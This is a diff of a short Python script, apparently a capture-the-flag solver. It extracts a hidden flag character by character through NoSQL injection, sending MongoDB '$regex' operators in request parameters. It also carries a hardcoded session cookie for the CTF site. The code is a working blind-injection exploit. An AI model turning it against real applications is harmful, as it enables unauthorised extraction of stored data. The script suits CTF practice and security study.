@@ -1,29 +1,23 @@
 import string
+from urllib.parse import urlencode
 
 import requests
 
-base_url = "https://ctfc2.ctf.intigriti.io/submit_flag"
-# table = string.ascii_uppercase + string.ascii_lowercase + string.digits + "{}_"
-table = string.ascii_lowercase + string.digits + string.ascii_uppercase + "{}_"
+base_url = "http://localhost:3000/api/v1/post"
+table = string.ascii_lowercase + string.ascii_uppercase + string.digits + "{}_"
 
-flag = "INTIGRITI{h0w"
+flag = ""
 
 while True:
     for char in table:
-        cookie = "session=eyJ1c2VyIjp7Il9pZCI6IjViYjBiMTc1NWU5YjRjMmY4OTg3MWNhYTE3ODRlODVmIiwidXNlcm5hbWUiOiJhc2RmIn19.ZVitwA.BVh_F1hAUqCugGPwJGwYBamiEYk"
-
-        headers = {
-            "Cookie": cookie
+        params = {
+            "searchParam[deleted]": "true",
+            "searchParam[flag][$regex]": f"^{flag}{char}"
         }
-
-        data = {
-            "challenge_flag": {"$regex": "^" + flag + char},
-            "_id": "_id:3"
-        }
-
-        result = requests.post(base_url, json=data, headers=headers)
-
-        if "correct flag!" in result.text:
+        query_string = urlencode(params)
+        result = requests.get(f"{base_url}?{query_string}")
+        posts = result.json()
+        if len(posts) > 0:
             flag += char
             print(flag)
             break
